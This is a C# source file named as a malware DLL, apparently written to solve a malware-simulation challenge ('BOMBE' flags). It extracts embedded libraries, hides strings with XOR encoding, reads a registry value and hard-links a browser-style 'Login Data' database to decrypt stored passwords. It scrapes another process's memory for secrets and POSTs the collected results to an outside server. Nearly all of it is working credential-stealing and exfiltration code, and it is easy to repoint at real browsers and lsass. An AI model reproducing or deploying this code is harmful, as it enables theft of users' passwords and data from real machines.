using Microsoft.Win32;
using System;
using System.Data.SQLite;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using static Malware_dll.Program;

namespace Malware_dll
{
    class Program
    {
        static string MyTempPath = Path.Combine(Path.GetTempPath(), "Bombe_Loader_" + Guid.NewGuid().ToString().Substring(0, 6));
        static string LogPath = @"C:\Users\Public\debug.txt";
        public static void Log(string message)
        {
            try
            {
                File.AppendAllText(LogPath, $"[{DateTime.Now:HH:mm:ss}] {message}\r\n");
            }
            catch {  }
        }

        const string SECRET = "00000000000000000000000000000000";
        const int PROCESS_ALL_ACCESS = 0x1F0FFF;
        const int MEM_COMMIT = 0x1000;
        const int PAGE_READWRITE = 0x04;

        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public uint AllocationProtect;
            public ulong RegionSize;
            public uint State;
            public uint Protect;
            public uint Type;
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll")]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, UIntPtr nSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        public static extern UIntPtr VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, UIntPtr dwLength);

        [DllImport("kernel32.dll")]
        public static extern bool CloseHandle(IntPtr hObject);

        [DllImport("Kernel32.dll", CharSet = CharSet.Unicode)]
        static extern bool CreateHardLink(string lpFileName, string lpExistingFileName, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SetDllDirectory(string lpPathName);
        public static void Run()
        {
            try
            {
                Log("=== Payload Started ===");
                Log($"[INFO] Temp Path: {MyTempPath}");

                PrepareEnvironment();

                ExecutePayload();
            }
            catch (Exception ex)
            {
                Log($"[FATAL] Run() Crashed: {ex.Message}\n{ex.StackTrace}");
            }
            finally
            {
                // 清理戰場 (可選)
                // try { Directory.Delete(MyTempPath, true); } catch { }
            }
        }

        static void PrepareEnvironment()
        {
            if (!Directory.Exists(MyTempPath)) Directory.CreateDirectory(MyTempPath);

            var assembly = Assembly.GetExecutingAssembly();
            string[] resourceNames = assembly.GetManifestResourceNames();

            foreach (var name in resourceNames) Log($"[RES] Found resource: {name}");

            var libsToDrop = new[] {
                new { Res = "Malware_dll.System.Data.SQLite.dll", File = "System.Data.SQLite.dll" },
                new { Res = "Malware_dll.SQLite.Interop.dll",     File = "SQLite.Interop.dll" },
                new { Res = "Malware_dll.Newtonsoft.Json.dll",    File = "Newtonsoft.Json.dll" }
            };

            foreach (var lib in libsToDrop)
            {
                string destPath = Path.Combine(MyTempPath, lib.File);

                string fullResName = resourceNames.FirstOrDefault(r => r.EndsWith(lib.Res, StringComparison.OrdinalIgnoreCase))
                                     ?? resourceNames.FirstOrDefault(r => r.EndsWith(lib.File, StringComparison.OrdinalIgnoreCase));

                if (fullResName != null)
                {
                    using (var stream = assembly.GetManifestResourceStream(fullResName))
                    using (var fs = File.Create(destPath))
                    {
                        stream.CopyTo(fs);
                    }
                    Log($"[DROP] Extracted {lib.File} to {destPath}");
                }
                else
                {
                    Log($"[ERR] Resource not found for {lib.File}!");
                }
            }

            bool setDirResult = SetDllDirectory(MyTempPath);
            Log($"[API] SetDllDirectory result: {setDirResult}");

            AppDomain.CurrentDomain.AssemblyResolve += (sender, args) =>
            {
                string dllName = new AssemblyName(args.Name).Name + ".dll";
                string dllPath = Path.Combine(MyTempPath, dllName);

                if (File.Exists(dllPath))
                {
                    Log($"[LOAD] Resolving {dllName} from {dllPath}");
                    return Assembly.LoadFrom(dllPath);
                }
                return null;
            };
        }

        public static class Obfuscator
        {
            private static byte key = 0xAA;

            public static string Decode(byte[] data)
            {
                byte[] result = new byte[data.Length];
                for (int i = 0; i < data.Length; i++)
                {
                    result[i] = (byte)(data[i] ^ key);
                }
                return System.Text.Encoding.ASCII.GetString(result);
            }
        }

        static int FindProcessIdByName(string processName)
        {
            foreach (Process proc in Process.GetProcessesByName(processName))
            {
                return proc.Id;
            }
            return -1;
        }

        static string ScanProcessMemory(string processName, string pattern, string answer_1, string answer_2)
        {
            int pid = FindProcessIdByName(processName);

            if (pid == -1)
            {
                Console.WriteLine($"Process {processName} not found.");
                return null;
            }

            IntPtr processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, pid);

            if (processHandle == IntPtr.Zero)
            {
                Console.WriteLine($"Could not open process: {pid}");
                return null;
            }

            IntPtr address = IntPtr.Zero;
            MEMORY_BASIC_INFORMATION memoryInfo;
            Regex regex = new Regex(pattern);

            try
            {
                while (VirtualQueryEx(processHandle, address, out memoryInfo, (UIntPtr)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != UIntPtr.Zero)
                {
                    if (memoryInfo.State == MEM_COMMIT && memoryInfo.Protect == PAGE_READWRITE)
                    {
                        byte[] buffer = new byte[memoryInfo.RegionSize];
                        if (ReadProcessMemory(processHandle, address, buffer, (UIntPtr)buffer.Length, out IntPtr bytesRead) && bytesRead.ToInt64() > 0)
                        {
                            string bufferString = System.Text.Encoding.ASCII.GetString(buffer);
                            MatchCollection matches = regex.Matches(bufferString);
                            foreach (Match match in matches)
                            {
                                if (match.Success && !match.Value.Contains(answer_1) && !match.Value.Contains(answer_2))
                                {
                                    return match.Value;
                                }
                            }
                        }
                        else
                        {
                            Console.WriteLine($"Failed to read memory at address {address.ToString("X")}");
                        }
                    }
                    address = new IntPtr(address.ToInt64() + (long)memoryInfo.RegionSize);
                }
            }
            finally
            {
                CloseHandle(processHandle);
            }

            return null;
        }

        static byte[] HexStringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length / 2)
                .Select(x => Convert.ToByte(hex.Substring(x * 2, 2), 16))
                .ToArray();
        }

        static byte[] DecryptPassword(byte[] encryptedPassword, byte[] key, byte[] iv)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = key;
                aesAlg.IV = iv;
                aesAlg.Mode = CipherMode.CBC;
                aesAlg.Padding = PaddingMode.PKCS7;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (System.IO.MemoryStream msDecrypt = new System.IO.MemoryStream(encryptedPassword))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (System.IO.StreamReader srDecrypt = new System.IO.StreamReader(csDecrypt))
                        {
                            return Encoding.UTF8.GetBytes(srDecrypt.ReadToEnd());
                        }
                    }
                }
            }
        }

        static string Challenge1()
        {
            byte[] encodedPath = new byte[] {
            0xF9, 0xE5, 0xEC, 0xFE, 0xFD, 0xEB, 0xF8, 0xEF, 0xF6, // "SOFTWARE\" after XOR
            0xE8, 0xE5, 0xE7, 0xE8, 0xEF  // "BOMBE" after XOR
        };
            string registryPath = Obfuscator.Decode(encodedPath); ;

            try
            {
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath))
                {
                    if (key == null)
                    {
                        Console.WriteLine($"Registry key {registryPath} not found.");
                        return null;
                    }

                    object value = key.GetValue("answer_1");

                    if (value == null)
                    {
                        Console.WriteLine($"answer_1 not found in registry key {registryPath}.");
                        return null;
                    }

                    return value.ToString();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading registry: {ex.Message}");
                return null;
            }
        }

        static string Challenge2()
        {
            string decryptedPassword = null;
            byte[] encodedDbPath = new byte[] { 0xe9, 0x90, 0xf6, 0xf6, 0xff, 0xd9, 0xcf, 0xd8, 0xd9, 0xf6, 0xf6, // "C:\\Users\\" after XOR
            0xc8, 0xc5, 0xc7, 0xc8, 0xcf, 0xf6, 0xf6, // "bombe\\" after XOR
            0xeb, 0xda, 0xda, 0xee, 0xcb, 0xde, 0xcb, 0xf6, 0xf6, // "AppData\\" after XOR
            0xe6, 0xc5, 0xc9, 0xcb, 0xc6, 0xf6, 0xf6, // "Local\\" after XOR
            0xc8, 0xc2, 0xd8, 0xc5, 0xc7, 0xcf, 0xf6, 0xf6, // "bhrome\\" after XOR
            0xe6, 0xc5, 0xcd, 0xc3, 0xc4, 0x8a, 0xee, 0xcb, 0xde, 0xcb }; // "Login Data" after XOR
            string dbPath = Obfuscator.Decode(encodedDbPath);
            byte[] key = Encoding.UTF8.GetBytes(SECRET);

            // Challenge: File Access Monitor
            string stealDbPath = "C:\\Users\\Public\\steal_login_data.db";
            CreateHardLink(stealDbPath, dbPath, IntPtr.Zero);

            using (SQLiteConnection conn = new SQLiteConnection($"Data Source={stealDbPath};Version=3;"))
            {
                conn.Open();
                using (SQLiteCommand cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", conn))
                {
                    using (SQLiteDataReader reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string originUrl = reader.GetString(0);
                            string username = reader.GetString(1);

                            byte[] encodedUser = new byte[] { 0xC8, 0xC5, 0xC7, 0xC8, 0xCF }; // "bombe" after XOR

                            if (username != Obfuscator.Decode(encodedUser)) continue;

                            byte[] encryptedPassword = HexStringToByteArray(reader.GetString(2));

                            try
                            {
                                // Assuming the format of encryptedPassword is iv | ciphertext
                                byte[] iv = new byte[16]; // AES block size for CBC mode is 16 bytes
                                byte[] ciphertext = new byte[encryptedPassword.Length - iv.Length];

                                Buffer.BlockCopy(encryptedPassword, 0, iv, 0, iv.Length);
                                Buffer.BlockCopy(encryptedPassword, iv.Length, ciphertext, 0, ciphertext.Length);

                                byte[] decryptedPasswordBytes = DecryptPassword(ciphertext, key, iv);
                                decryptedPassword = Encoding.UTF8.GetString(decryptedPasswordBytes);
                            }
                            catch (Exception)
                            {
                                decryptedPassword = "Failed to decrypt";
                            }

                            return decryptedPassword;
                        }
                    }
                }
            }

            try { System.IO.File.Delete(stealDbPath); } catch { }

            return decryptedPassword;
        }

        static string Challenge3(string answer_1, string answer_2)
        {
            byte[] encodedProcessName = new byte[] { 0xc8, 0xd9, 0xcb, 0xd9, 0xd9 }; //  "bsass" after XOR
            string processName = Obfuscator.Decode(encodedProcessName);
            byte[] encodedPattern = new byte[] { 0xE8, 0xE5, 0xE7, 0xE8, 0xEF, 0xF5, 0xE7, 0xEB, 0xE6, 0xF5, 0xEC, 0xE6, 0xEB, 0xED, 0xF5, 0xF6, 0xDD, 0xD1, 0x99, 0x98, 0xD7 }; // "BOMBE_MAL_FLAG_\\w{32}" after XOR
            string pattern = Obfuscator.Decode(encodedPattern);

            return ScanProcessMemory(processName, pattern, answer_1, answer_2);
        }

        private static void SendAnswerToServer(string jsonPayload)
        {
            Log("[NET] SendAnswerToServer invoked.");

            try
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                byte[] encodedURL = new byte[] { 0xc2, 0xde, 0xde, 0xda, 0xd9, 0x90, 0x85, 0x85, 0xd9, 0xdf, 0xc8, 0xc7, 0xc3, 0xde, 0x84, 0xc8, 0xc5, 0xc7, 0xc8, 0xcf, 0x84, 0xde, 0xc5, 0xda, 0x85, 0xd9, 0xdf, 0xc8, 0xc7, 0xc3, 0xde, 0xe7, 0xcb, 0xc6, 0xeb, 0xc4, 0xd9 }; // "https://submit.bombe.top/submitMalAns" after XOR
                string URL = Obfuscator.Decode(encodedURL);

                Log($"[NET] Target URL: {URL}");

                // 5. 使用 WebClient (System.dll 內建，無額外依賴)
                    using (WebClient wc = new WebClient())
                {
                    wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                    wc.Headers[HttpRequestHeader.UserAgent] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";

                    Log("[NET] Uploading data...");

                    string responseBody = wc.UploadString(URL, "POST", jsonPayload);

                    Log($"[NET] Success! Response: {responseBody}");
                    Console.WriteLine($"Response: {responseBody}");
                }
            }
            catch (WebException we)
            {
                string serverResp = "";
                if (we.Response != null)
                {
                    using (var reader = new System.IO.StreamReader(we.Response.GetResponseStream()))
                    {
                        serverResp = reader.ReadToEnd();
                    }
                }
                Log($"[NET_ERR] WebException: {we.Message}, Server says: {serverResp}");
            }
            catch (Exception e)
            {
                Log($"[NET_FATAL] Exception: {e.Message}\n{e.StackTrace}");
            }
        }

        [System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoInlining)]
        static async Task ExecutePayload()
        {
            try
            {
                Log("=== Payload Injected & Started ===");

                Log("Step 1: Reading Registry...");
                string answer_1 = Challenge1();
                Log($"[+] Flag 1 Result: {answer_1}");

                Log("Step 2: Starting SQLite...");
                string answer_2 = "Skipped";
                try
                {
                    answer_2 = Challenge2();
                    Log($"[+] Flag 2 Result: {answer_2}");
                }
                catch (Exception ex)
                {
                    Log($"[!] SQLite Crash: {ex.Message}");
                    Log($"[!] StackTrace: {ex.StackTrace}");
                }

                Log("Step 3: Scanning Memory...");
                string answer_3 = Challenge3(answer_1, answer_2);
                Log($"[+] Flag 3 Result: {answer_3}");

                string json = $@"{{
                    ""answer_1"": ""{answer_1}"",
                    ""answer_2"": ""{answer_2}"",
                    ""answer_3"": ""{answer_3}"",
                    ""secret"": ""{SECRET}""
                }}";

                Log($"[NET] JSON Prepared. Length: {json.Length}");

                SendAnswerToServer(json);

                Log("=== Execution Finished ===");
            }
            catch { }
        }
    }
}